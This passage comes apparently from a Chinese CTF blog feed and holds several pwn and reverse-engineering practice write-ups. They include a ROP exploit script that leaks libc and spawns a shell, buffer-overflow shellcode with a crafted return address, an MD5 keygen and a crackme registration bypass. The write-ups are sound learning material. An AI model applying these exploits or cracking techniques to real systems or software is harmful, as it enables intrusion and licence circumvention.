      print &apos;cookie&apos;, hex(cookies)

      add1(io, 0, &apos;cccc&apos;,100, &apos;0517&apos;)
      io.gdb_hint()

      show(io, 2)
      io.read_until(&apos;again\n&apos;)

      puts_plt = code_base + 0x0000000000000BC0
      puts_got = code_base + 0x0000000000202F20
      pop_rdi_ret = code_base + 0x0000000000001653
      read_int = code_base + 0x0000000000000F80
      payload = &apos;a&apos;*0x18 + l64(cookies) + &apos;aaaaaaaa&apos;*5 + l64(pop_rdi_ret) +   l64(puts_got) + l64(puts_plt) + l64(pop_rdi_ret)+l64(0) + l64(read_int)

      io.writeline(payload)

      puts = l64(io.readline()[:-1].ljust(8, &apos;\x00&apos;))
      libc_base = puts - 0x000000000006F5D0

      print hex(libc_base)
      system = libc_base + 0x0000000000045380
      binsh = libc_base + 0x000000000018C58B
      payload = &apos;a&apos;*0x18 + l64(cookies) + &apos;aaaaaaaa&apos;*5 + l64(pop_rdi_ret) +   l64(binsh) + l64(system)

      io.writeline(payload)

      io.gdb_hint()
      interact(io)


exp(target)
</code></pre>]]></content>
      
        <categories>
            
            <category> matches </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 8之PEiD插件]]></title>
      <url>/2017/02/16/practice-8%E4%B9%8BPEiD%E6%8F%92%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>第八题</p>
<a id="more"></a>
<p>PEiD有一个叫做Krypto ANALyzer的插件，使用这个插件可以对程序进行扫描，通过特征匹配来识别程序内部可能用到的一些标准算法。</p>
<p>先看题目，随便输入就会报错。<br><img src="http://i1.piimg.com/567571/c642907456446fbf.png" alt=""><br><img src="http://p1.bqimg.com/567571/b43926ec4b85a522.png" alt=""></p>
<p>利用IDA找到关键点这些烂熟于心的步骤就不再提了，对下面这段关键算法分析完了之后发现关键函数是sub_401510,但是点开这个函数，真的是好长的一大串，</p>
<p><img src="http://i1.piimg.com/567571/ff6c02d3779819ea.png" alt=""></p>
<p>用PEid的插件进行分析，提示这个程序用了 MD5算法。<br><img src="http://i1.piimg.com/567571/46fc552dd3e5a390.png" alt=""><br><img src="http://p1.bqimg.com/567571/47c4bd1bc68a9386.png" alt=""></p>
<p>根据提示地址，在IDA反汇编指示图按下G，输入00401E5C,就会自动跳转到函数代码中<br><img src="http://p1.bpimg.com/567571/2f6f6ca29be65524.png" alt=""></p>
<p> 可以从sub_401D10回溯到sub_4026F0，继续通过交叉引用往上回溯，依次为sub_4027B0、sub_401C00、sub_401BB0、sub_401510，而sub_401510就是我们在实验步骤一种为一个暂时不理解的函数。那么我们可以猜测sub_401510这个函数就是用来计算用户名的MD5值的，我们可以通过OD动态调试来验证我们的想法。</p>
<p>通过阅读IDA中的反汇编代码，我们知道在00401752处调用了sub_401510这个函数，<br><img src="http://p1.bqimg.com/567571/4c7d41a3249b3995.png" alt=""></p>
<p>OK使用OD载入在00401752设置断点，输入test，直接跳转到执行sub_401510，看到eax寄存器值正好是test的MD5值<br><img src="http://p1.bqimg.com/567571/b35f765b38776431.png" alt=""></p>
<p>这里说明插件判别是正确的正好使用python写一个MD5的注册机</p>
<pre><code>#!usr/bin/python
#-*- coding:utf-8 -*-
import hashlib
while True:     
username = raw_input(&quot;input username:&quot;)     
md5 = hashlib.md5(username).hexdigest().upper()     
serial = md5[::-1]  # 翻转字符串     
print &quot;serial: %s&quot; % serial
</code></pre>]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 7之行为分析]]></title>
      <url>/2017/02/14/practice-7%E4%B9%8B%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>第七题</p>
<a id="more"></a>
<p>看完教程发现这题写起来很简单，但是我们以前是没有接触过（病毒分析）<br>而且通过这题我知道了一个在线的行为分析工具，人称，<br>在线沙箱： 网上有许多公开的在线沙箱，使用这些沙箱提供的服务，我们可以方便的观察一个程序的详细行为报告，进而判断一个程序大致的内部逻辑。</p>
<p>病毒是个img文件，无法执行的文件，可以使用7zip打开如图，看看文件内部隐藏了些什么。<br><img src="http://p1.bqimg.com/567571/6712dc0a1e0419f1.png" alt=""></p>
<p>打开会发现如图文件：一个游戏这时便出现误区，难道是玩游戏过关吗？<br>看下面的文件，用记事本打开，是提示，游戏有后门<br><img src="http://p1.bpimg.com/567571/2cc071a0d0ff25e1.png" alt=""><br><img src="http://p1.bqimg.com/567571/f91384e4608dd9c1.png" alt=""></p>
<p>打开游戏最上面一行亮了，我去。<br><img src="http://i1.piimg.com/567571/c954c283b5a711cb.png" alt=""></p>
<p>继续用7zip试着打开，果然里面还有东西，<br>我们发现里面有三个文件，分别为1.vbs、1.exe、2.exe，如下图所示：<br>第二个是游戏第一个打开知识闪过了指令框，猜测这可能就是所谓的“病毒文件”<br><img src="http://p1.bpimg.com/567571/25d8549665adaae9.png" alt=""></p>
<p>用在线沙箱分析来加快我们的分析流程，看看1.exe都有哪些行为特征。 打开金山火眼<a href="https://fireeye.ijinshan.com/" target="_blank" rel="external">https://fireeye.ijinshan.com/</a>，注册一个账号并激活，点击“分析文件”上传1.exe进行分析，等待一段时间就可以看到分析报告了。<br><img src="http://p1.bqimg.com/567571/99648fbd3c5363af.png" alt=""></p>
<p>从分析报告中我们可以看出，1.exe释放了一个test.txt文件到当前目录，而且把test.txt的文件属性设置为系统和隐藏，因此我们看不到文件夹里面多了一个txt文件。现在使用记事本打开这个test.txt文件，文件内容为（WdubQ4IGEzAG54NfATJTNhI4TLIvPvENyTLLWb3YCNBeK5wad5XCgrSQNOih1F），如图所示：<br><img src="http://p1.bqimg.com/567571/5f16873a51991aa1.png" alt=""></p>
<p>最够根据提示信息把所得到的字符串   使用MD5计算工具，算出这个字符串的16位MD5值，为ba3c34ec7cd9c086，这就是我们要找的flag了，如图所示：<br><img src="http://p1.bpimg.com/567571/7d6b829f33ff0726.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 6之算法夹杂]]></title>
      <url>/2017/02/13/practice-6%E4%B9%8B%E7%AE%97%E6%B3%95%E5%A4%B9%E6%9D%82/</url>
      <content type="html"><![CDATA[<p>第六题</p>
<a id="more"></a>
<p>之前没做出来的一道题目，各种密码学的夹杂，看到很多.so库估计当时也没啥想法了<br><img src="http://p1.bpimg.com/567571/d4e47457eda5dab9.png" alt=""><br>很明了，对输入进行检验，过了就输出right，错了就输出wrong，分析一下check_401510这个函数。先是判断字符范围，ASCII码不能超过90。</p>
<p><img src="http://p1.bqimg.com/567571/7c461f4bddbabf79.png" alt=""><br>然后取输入的前5个字符，作md5加密，如下三个函数就是实现了md5算法</p>
<p><img src="http://p1.bpimg.com/567571/ce68c67077d534db.png" alt=""><br>接下来就是用前五个字符的md5值的前8字节作为DES算法的key，并且采用ECB模式分组加密。</p>
<p><img src="http://p1.bpimg.com/567571/376e813074677116.png" alt=""><br>然后就是对DES加密后的结果作base64变换，v9是DES加密结果，v21保存base64结果。</p>
<p><img src="http://i1.piimg.com/567571/c10b9ac205db0fc6.png" alt=""><br>最后就是和check数组比较，check数组内容即是：<br>‘OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==’</p>
<p><img src="http://i1.piimg.com/567571/4130ddacfe72cdf1.png" alt=""><br>所以采用爆破的方式去得到flag，设flag前五位为temp，并且用其md5值前8字节作为DES算法的key，当解密出来的flag前五位和temp相等时，即为flag。<br>脚本如下：（参考的大神writeup）</p>
<pre><code>import pyDes
import base64
import hashlib
import string
check = &quot;OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==&quot;
miwen = base64.b64decode(check)
count = 0
for i in string.uppercase + string.digits:
    for j in string.uppercase + string.digits:
         for k in string.uppercase + string.digits:
              for m in string.uppercase + string.digits:
                   for n in string.uppercase + string.digits:
                count = count + 1
                tmp = i+j+k+m+n
                md5_tmp = hashlib.md5(tmp).hexdigest()
                key = md5_tmp[0:16].decode(&quot;hex&quot;)
                result = pyDes.des(key)
                y = result.decrypt(miwen[:8])
                if y[0:5] == tmp:
                   print y
                if count % 10000 == 0:
                    print count
</code></pre><p>这道题目主要就是各种密码算法的交杂，在代码的分析上比较困难，即使参照writeup也很难掌握，后面还得好好在琢磨琢磨</p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 5之万能断点]]></title>
      <url>/2017/02/12/practice-5%E4%B9%8B%E4%B8%87%E8%83%BD%E6%96%AD%E7%82%B9/</url>
      <content type="html"><![CDATA[<p>第五个只能算得上是学习一个新技能–万能断点之前没听过。</p>
<a id="more"></a>
<p>给的是一个未注册版本的软件，题目要求将其注册<br><img src="http://i1.piimg.com/567571/c605a20b50eab2fa.png" alt=""></p>
<p>乱填只能是出错误<br><img src="http://p1.bqimg.com/567571/adffda9e620b625e.png" alt=""></p>
<p>放入IDA用运行，然后点击输入注册码，报错之后暂停OD调试<br><img src="http://p1.bpimg.com/567571/ea8a4f1bc14d49a0.png" alt=""></p>
<p>如下图查看user3模块<br><img src="http://i1.piimg.com/567571/6cfadb9ca492a981.png" alt=""></p>
<p>转到这个模块下之后便开始下万能断点；查找二进制字符串（crtl+B）,然后在弹出的框内输入万能断点并将跳转处设为断点<br><img src="http://i1.piimg.com/567571/aed4c1c824baa65f.png" alt=""><br><img src="http://p1.bpimg.com/567571/783b981f42680e28.png" alt=""></p>
<p>重新载入程序，依旧输入错误注册码（由于万能断点，在运行到弹出输入界面时，中途会多次暂停）输入结束之后便可以按F8单步步过。直到堆栈窗口出现正确的注册码<br><img src="http://p1.bqimg.com/567571/f04d8f4dfdc4c4a9.png" alt=""></p>
<p>输入检验注册成功：<br><img src="http://i1.piimg.com/567571/ed5ca99ef2505eec.png" alt=""></p>
<p>万能断点：“F3 A5 8B C8 83 E1 03 F3 A4 E8”</p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-4之IDA用法]]></title>
      <url>/2017/02/12/practice-4%E4%B9%8BIDA%E7%94%A8%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>第四题</p>
<a id="more"></a>
<p>打开是这样的，看English了解掷骰子，输入任意数字（3），我发现第一次输入三进行到下一步，但是退出重启之后在输入3则为错的，所以想要在9^5种可能中猜出随机变化的数字几率，除非脸白。，还是分析源程序得到答案吧</p>
<p><img src="http://i1.piimg.com/567571/ad1edc303428e742.png" alt=""></p>
<p>用IDA打开程序。进入之后shift+f12查找关键字符串。<br><img src="http://i1.piimg.com/567571/4b5e89a9e732ebd5.png" alt=""></p>
<p>找到“Nice job.here is the flag”,双击跳转过去。会看到WinMain函数（常见的C++程序函数）直接反汇编<br><img src="http://p1.bqimg.com/567571/859b2719e122dee0.png" alt=""></p>
<p>然后就是分析代码过程了</p>
<blockquote>
<p>v56 = std::operator&lt;&lt;<std::char_traits<char>&gt;((int)&amp;std::cout, “[*] Nice job, here is the flag: “);<br>v57 = std::operator&lt;&lt;<char,std::char_traits<char>,std::allocator<char>&gt;(v56, &amp;v88);</char></char,std::char_traits<char></std::char_traits<char></p>
</blockquote>
<p>std::operator&lt;&lt;其实就是C++中的cout&lt;&lt;,所以这边就是输出那句话之后输出v88里的字符串，所以v88就变成了解题的关键了。</p>
<p>(新学到，之前没用过)在IDA里按art+T，搜索v88，在ctrl+T 继续查找下一个</p>
<p>第一个找到的：</p>
<blockquote>
<p>std::string::operator=((std::string *)&amp;v88, &amp;byte_444240);</p>
</blockquote>
<p>这是一个赋值语句，鼠标双击byte_444240即可看到字符串的内容，选择字符串开头到00之前的所有字符，(新知识)按下shift+E导出数据，得到：<br><img src="http://i1.piimg.com/567571/1f5d25c4a7e3afc3.png" alt=""></p>
<p>在回到伪代码查看v88<br><img src="http://p1.bqimg.com/567571/b7eaf8df4240ff31.png" alt=""></p>
<p>最后一句很明确就是find/查找v88开头是不是ebCTF字样，然后代码里唯一对v88操作的只有跟v91去异或。<br>如果不想用暴力破解得到flag的话（因为v88知道了，也就是经过异或运算就可以得到flag，所以完全可以暴破），就再查找看v91的相关语句。</p>
<p>找到<br>std::string::operator=((std::string *)&amp;v91, &amp;byte_444309);<br>同样双击byte_444309查看字符串：<br>02370F350F3C15073C302A30551237151E350151</p>
<p>与v91相关的：<br><img src="http://p1.bpimg.com/567571/e093e59b0b072b8a.png" alt=""><br><img src="http://i1.piimg.com/567571/13e63d0fc4f41e2d.png" alt=""></p>
<p>第一个是跟v90异或，第二个是跟v89异或<br>所以目标再盯住v89、v90即可<br><img src="http://p1.bpimg.com/567571/5133d1217db4c3eb.png" alt=""></p>
<p>除了上面的截图，前面每次掷骰子正确之后也对v89进行了操作，容易遗漏最后v89计算出来是100</p>
<p><img src="http://i1.piimg.com/567571/f07548cdb49c2fc8.png" alt=""></p>
<p>v90有关见上图，看看程序，不难看出v90取16<br>综上，把v91这个字符串异或v89后，再异或v90，再跟v88异或就得到flag。用python来计算：</p>
<pre><code># -*- coding:utf-8 -*-

def flag():
  v89,v90=100,16
  v91=&quot;02370F350F3C15073C302A30551237151E350151&quot;
  v88=&quot;132138153D3357472D276A73440526595C79174445771A75497D054A78746A70420271050F2208&quot;

  v91=[ord(i) for i in v91.decode(&apos;hex&apos;)]
  for i in xrange(len(v91)):
v91[i]^=v89^v90

  v88=[ord(i) for i in v88.decode(&apos;hex&apos;)]
  res=&quot;&quot;
  for i in xrange(len(v88)):
res+=chr(v88[i]^v91[i%len(v91)])
  print res
  pass

if __name__ == &apos;__main__&apos;:
  flag()
</code></pre>]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-3之pyo学习]]></title>
      <url>/2017/02/10/practice-3%E4%B9%8Bpyo%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>第三题：</p>
<a id="more"></a>
<p><img src="http://p1.bpimg.com/567571/f6f07b1c6c6b6110.png" alt=""></p>
<p>下载下来是个这个名字的题目，也不像之前遇到的后缀里虽然杂乱也存在正确后缀的，于是想到一个格式分析工具，拖进去看看是一个pyo格式文件，回想一下以前也没见过这种格式的题目，百度一下知道这种格式其实与pyc一样，都是将py程序编译成可执行程序。</p>
<p><img src="http://p1.bqimg.com/567571/dea3c80b61ac1829.png" alt=""></p>
<p>知道格式之后先改后缀，然后转换格式<br>再用python2.7下的反编译工具unompyle把这个题目的源代码弄出来</p>
<p><img src="http://i1.piimg.com/567571/9dcef39919cb8fc9.png" alt=""></p>
<pre><code>#!usr/bin/python
#-*- coding:utf-8 -*-
import sys
lookup = [196,
 153,
 149,
 206,
 17,
 221,
 10,
 217,
 167,
 18,
 36,
 135,
 103,
 61,
 111,
 31,
 92,
 152,
 21,
 228,
 105,
 191,
 173,
 41,
 2,
 245,
 23,
 144,
 1,
 246,
 89,
 178,
 182,
 119,
 38,
 85,
 48,
 226,
 165,
 241,
 166,
 214,
 71,
 90,
 151,
 3,
 109,
 169,
 150,
 224,
 69,
 156,
 158,
 57,
 181,
 29,
 200,
 37,
 51,
 252,
 227,
 93,
 65,
 82,
 66,
 80,
 170,
 77,
 49,
 177,
 81,
 94,
 202,
 107,
 25,
 73,
 148,
 98,
 129,
 231,
 212,
 14,
 84,
 121,
 174,
 171,
 64,
 180,
 233,
 74,
 140,
 242,
 75,
 104,
 253,
 44,
 39,
 87,
 86,
 27,
 68,
 22,
 55,
 76,
 35,
 248,
 96,
 5,
 56,
 20,
 161,
 213,
 238,
 220,
 72,
 100,
 247,
 8,
 63,
 249,
 145,
 243,
 155,
 222,
 122,
 32,
 43,
 186,
 0,
 102,
 216,
 126,
 15,
 42,
 115,
 138,
 240,
 147,
 229,
 204,
 117,
 223,
 141,
 159,
 131,
 232,
 124,
 254,
 60,
 116,
 46,
 113,
 79,
 16,
 128,
 6,
 251,
 40,
 205,
 137,
 199,
 83,
 54,
 188,
 19,
 184,
 201,
 110,
 255,
 26,
 91,
 211,
 132,
 160,
 168,
 154,
 185,
 183,
 244,
 78,
 33,
 123,
 28,
 59,
 12,
 210,
 218,
 47,
 163,
 215,
 209,
 108,
 235,
 237,
 118,
 101,
 24,
 234,
 106,
 143,
 88,
 9,
 136,
 95,
 30,
 193,
 176,
 225,
 198,
 197,
 194,
 239,
 134,
 162,
 192,
 11,
 70,
 58,
 187,
 50,
 67,
 236,
 230,
 13,
 99,
 190,
 208,
 207,
 7,
 53,
 219,
 203,
 62,
 114,
 127,
 125,
 164,
 179,
 175,
 112,
 172,
 250,
 133,
 130,
 52,
 189,
 97,
 146,
 34,
 157,
 120,
 195,
 45,
 4,
 142,
 139]
pwda = [188,
 155,
 11,
 58,
 251,
 208,
 204,
 202,
 150,
 120,
 206,
 237,
 114,
 92,
 126,
 6,
 42]
pwdb = [53,
 222,
 230,
 35,
 67,
 248,
 226,
 216,
 17,
 209,
 32,
 2,
 181,
 200,
 171,
 60,
 108]
flag = raw_input(&apos;Input your Key:&apos;).strip()
if len(flag) != 17:
print &apos;Wrong Key!!&apos;
sys.exit(1)
flag = flag[::-1]
for i in range(0, len(flag)):
if ord(flag[i]) + pwda[i] &amp; 255 != lookup[i + pwdb[i]]:
print &apos;Wrong Key!!&apos;
sys.exit(1)

print &apos;Congratulations!!&apos;
</code></pre><p>虽然长关键是最后哪儿的处理，在最后做一个修改就可以了，第一次想的方法是根据以前做题的经验进行爆破的，有碰巧的嫌疑：<br>前面关键数据不变把最后的数据进行改变如下图<br><img src="http://p1.bpimg.com/567571/b24c84a5e14b7b05.png" alt=""></p>
<p>最后跑出来的结果：<br><img src="http://p1.bpimg.com/567571/04f12b12d829bae6.png" alt=""></p>
<p>其实这样子添加abcde等字符的方法有凑巧之嫌。万一有#之类的问题该如何，第一次改就漏掉了‘<em>’不是猜测真的得不出17位把‘</em>’给落掉了，随意中途也突然想了一个方法，直接一个<br>for循环在0到128之间进行爆破并用组进行保存，最后直接通过ord()函数进行转换就能得到最后的flag</p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-2之汇编]]></title>
      <url>/2017/02/10/practice-2%E4%B9%8B%E6%B1%87%E7%BC%96/</url>
      <content type="html"><![CDATA[<p>一道ELFx64的题目，只能用IDA载入，找到main函数，F5得到代码</p>
<a id="more"></a>
<p><img src="http://p1.bpimg.com/567571/a2e89c3e87adaa1c.png" alt=""><br><img src="http://i1.piimg.com/567571/c0cb05d8dcdb8af5.png" alt=""></p>
<p>看上面两个图，代码可读性果然不太好。前面print的一大堆应该是文件的提示字符串输入重点是后面的while循环以及那个if语句，直接看到if可以发现flag的最后几个变量必须是0，8，2，3这个不难看出来，</p>
<p>试着看汇编把，看总览图，也不知道是不是这个技巧，看看剪头分布能推断出哪一段是循环语句所在之处，if判断之处啥的</p>
<p><img src="http://p1.bqimg.com/567571/0d7431885146e522.png" alt=""><br>跟着C语言看看汇编语言吧</p>
<p><img src="http://p1.bpimg.com/567571/b75fa1867dfcce75.png" alt=""></p>
<p>进过上述分析可以知道var_40应该使我们输入的结果，所以必须必须知道var_C0的数据跳到相应位置</p>
<p><img src="http://p1.bqimg.com/567571/ee0a905c88d36e04.png" alt=""></p>
<p>是空的，再回到代码找找，会发现这样子一串操作</p>
<p><img src="http://p1.bpimg.com/567571/be188fea8aca2fa0.png" alt=""></p>
<p>刚好17个数字，所以说var_i[i] = ((var_C0[i]-1)+(var_C0[i]-1)&gt;&gt;0x1f)&gt;&gt;1</p>
<p>好的，python写脚本：</p>
<pre><code>#!usr/bin/python
#-*- coding:utf-8 -*-

key = [0x0EF,
0x0C7,
0x0E9,
0x0CD,
0x0F7,
0x08B,
0x0D9,
0x08D,
0x0BF,
0x0D9,
0x0DD,
0x0B1,
0x0BF,
0x087,
0x0D7,
0x0DB,
0x0BF
]
flag = []
for i in range(0,17):
       ch = ((key[i]-1)+((key[i]-1)&gt;&gt;0x1f))&gt;&gt;1;
       flag.append(chr(ch))
print(flag)
print(&apos;0823}&apos;)
</code></pre><p>最后结果：</p>
<p><img src="http://p1.bqimg.com/567571/467aece24b3b0cf4.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[8道Pwn基础练习所得]]></title>
      <url>/2017/02/09/8%E9%81%93Pwn%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0%E6%89%80%E5%BE%97/</url>
      <content type="html"><![CDATA[<p>刚开始做pwn的题目，从基础开始咯，所以在合天上先总结一些学到的指令。（基础gdb就不多说了）<br>{!:在数据填充的时候不可以用换行符号进行填充}</p>
<a id="more"></a>
<h3 id="一、Pwn基础练习1"><a href="#一、Pwn基础练习1" class="headerlink" title="一、Pwn基础练习1"></a>一、Pwn基础练习1</h3><p>查询pwn程序的c语言源代码</p>
<blockquote>
<p>cat  pwn.c</p>
</blockquote>
<p>直接将64个A和一个B通过管道输入到程序中</p>
<blockquote>
<p>python -c “print ‘A’*64+’B’” | ./pwn</p>
</blockquote>
<h3 id="二、Pwn基础练习2"><a href="#二、Pwn基础练习2" class="headerlink" title="二、Pwn基础练习2"></a>二、Pwn基础练习2</h3><p> Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。<br>将AAA BBB CCC传给指定的test指令然后进行输出。<br>（用户函数中没有获取函数值语句的程序当中）</p>
<blockquote>
<p>python -c “print ‘AAA BBB CCC’” | xargs ./test</p>
</blockquote>
<p>以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）</p>
<blockquote>
<p>x /4xb $esp+0x5C  </p>
</blockquote>
<h3 id="三、Pwn基础练习3"><a href="#三、Pwn基础练习3" class="headerlink" title="三、Pwn基础练习3"></a>三、Pwn基础练习3</h3><p><strong>Python基础知识</strong></p>
<p>   Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。</p>
<p>   运行脚本就可以把这题pwn成功</p>
<blockquote>
<p>  import os</p>
<p>   defpwn():<br>   os.putenv(“HEETIAN”,”A”*64+”\x0a\x0d\x0a\x0d”)<br>   os.system(“./pwn3”)<br>   if <strong>name</strong> ==”<strong>main</strong>“:<br>   pwn()</p>
</blockquote>
<p>在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。）</p>
<blockquote>
<p>export testenv=”Hello_World”</p>
</blockquote>
<p>Linux Shell中，可以使用$()或者两个反引号（<code>）来包裹一条shell命令，并返回shell命令的执行结果。
比如执行export testenv2=</code>python -c “print ‘A’*20”`命令后，再执行./env可以看到有一个名为testenv2的环境变量，其值为20个A。</p>
<blockquote>
<p>export testenv2=<code>python -c &quot;print &#39;A&#39;*20&quot;</code></p>
</blockquote>
<h3 id="四、Pwn基础练习4"><a href="#四、Pwn基础练习4" class="headerlink" title="四、Pwn基础练习4"></a>四、Pwn基础练习4</h3><p><strong>一、objdump使用</strong></p>
<p>   使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。</p>
<p>使用下面这条指令可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作</p>
<blockquote>
<p>objdump -d pwn4</p>
</blockquote>
<h3 id="五、Pwn基础练习5"><a href="#五、Pwn基础练习5" class="headerlink" title="五、Pwn基础练习5"></a>五、Pwn基础练习5</h3><p>1、C语言函数调用约定通过压栈实现参数传递，且参数压栈顺序为从右往左<br>2、查询esp寄存器中的值 </p>
<blockquote>
<p>i r $esp</p>
</blockquote>
<h3 id="六、Pwn基础练习6"><a href="#六、Pwn基础练习6" class="headerlink" title="六、Pwn基础练习6"></a>六、Pwn基础练习6</h3><p>二、Shellcode<br>   Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。<br>   Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为：</p>
<p>   <a href="http://shell-storm.org/shellcode/" target="_blank" rel="external">http://shell-storm.org/shellcode/</a></p>
<p>   <a href="http://www.exploit-db.com/shellcode/" target="_blank" rel="external">http://www.exploit-db.com/shellcode/</a></p>
<p>具有复杂功能的Shellcode无法作用于不同类型的操作系统（如Windows、Linux）<br>将pwn6.py 脚本写到test文件里面  然后把test文本拖到pwn6程序里面运行。</p>
<blockquote>
<p>python pwn6.py test<br>./pwn6 &lt; test</p>
</blockquote>
<p>shellcod的python脚本</p>
<blockquote>
<p>shellcode = (“\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe” +<br>“\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff” +<br>“\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69” +<br>“\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81”)</p>
<p>print ‘A’*76 + ‘\xd0\xd6\xff\xff’ + shellcode</p>
</blockquote>
<h3 id="七、Pwn基础练习7"><a href="#七、Pwn基础练习7" class="headerlink" title="七、Pwn基础练习7"></a>七、Pwn基础练习7</h3><p><strong>一、__builtin_return_address函数</strong></p>
<p>  <strong>builtin_return_address函数接收一个参数，可以是0,1,2等。</strong>builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址.</p>
<p><strong>二、理解多层跳转</strong></p>
<p>retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。</p>
<p>如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。</p>
<p><strong>三、函数作用</strong></p>
<p><strong>fflush()</strong>用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为：</p>
<blockquote>
<p>int fflush(FILE* stream);</p>
</blockquote>
<p>【参数】stream为文件指针。</p>
<p>【返回值】成功返回0，失败返回EOF，错误代码存于errno 中。指定的流没有缓冲区或者只读打开时也返回0值。</p>
<p><strong>fflush()</strong>也可用于标准输入（stdin）和标准输出（stdout），用来清空标准输入输出缓冲区。</p>
<p><strong>stdin</strong> 是 standard input 的缩写，即标准输入，一般是指键盘；标准输入缓冲区即是用来暂存从键盘输入的内容的缓冲区。</p>
<p><strong>stdout</strong> 是 standard output 的缩写，即标准输出，一般是指显示器；标准输出缓冲区即是用来暂存将要显示的内容的缓冲区。</p>
<h3 id="八、Pwn基础练习8"><a href="#八、Pwn基础练习8" class="headerlink" title="八、Pwn基础练习8"></a>八、Pwn基础练习8</h3><p><strong>二、strdup函数</strong></p>
<p>   strdup可以用于复制一个字符串，我们通常使用字符串时会使用strcpy，这要求已经定义好了一个接收缓冲区。而strdup只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。</p>
<p><strong>三、grep命令</strong></p>
<p>   当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。<br>   我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。<br>   对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，<em>是正则表达式里面的通配符，如果要查找</em>，需要使用反斜杠进行转移，即*。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步学ROP之x86篇]]></title>
      <url>/2017/02/08/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bx86%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>根据寒假计划的第三计划，是该学习rop了。下面是学习rop之linux_x86篇的学习笔记以及总结。<br><a id="more"></a></p>
<p>语知其事，先解其意。rop是什么？</p>
<h3 id="一、ROP"><a href="#一、ROP" class="headerlink" title="一、ROP"></a>一、ROP</h3><p>   ROP的全称为Return-oriented programming（返回导向编程），这一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p>
<p>了解了其意思，下面就是学习内容</p>
